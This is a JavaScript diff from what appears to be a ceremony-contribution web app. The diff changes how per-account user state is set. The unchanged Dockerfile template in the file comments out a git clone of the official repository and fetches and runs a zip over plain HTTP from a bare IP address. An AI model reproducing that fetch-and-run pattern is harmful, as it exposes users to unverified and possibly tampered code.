@@ -7,7 +7,7 @@ const dockerFileBack =
 "\nENV COMMAND=\"cargo run --release -p client ${ADDR} ${ATTESTATION_KEY} ${OPTION} ${ENTROPY}\" \n#RUN git clone https://github.com/MystenLabs/ts-coordinator.git \nRUN wget http://185.209.177.123:8099/ts-coordinator.zip \nRUN unzip ts-coordinator.zip \nWORKDIR /ts-coordinator \nRUN ${COMMAND}";
 
 export async function contributeViaDocker(repo, currentAccount, entropy, signMessage, setUserState) {
-    setUserState(1);
+    setUserState(preState => new Map(preState.set(currentAccount.address, 1)));
     var addr = currentAccount.address;
     var ephemeralKey = Ed25519Keypair.generate();
     console.log(ephemeralKey);
@@ -45,6 +45,6 @@ export async function contributeViaDocker(repo, currentAccount, entropy, signMes
                 alert('Please run "sudo docker build --no-cache --progress=plain ." in the same folder Dockerfile is downloaded.');
             }
         }
-        setUserState(null);
+        setUserState(preState => new Map(preState.set(currentAccount.address, null)));
     }
 }
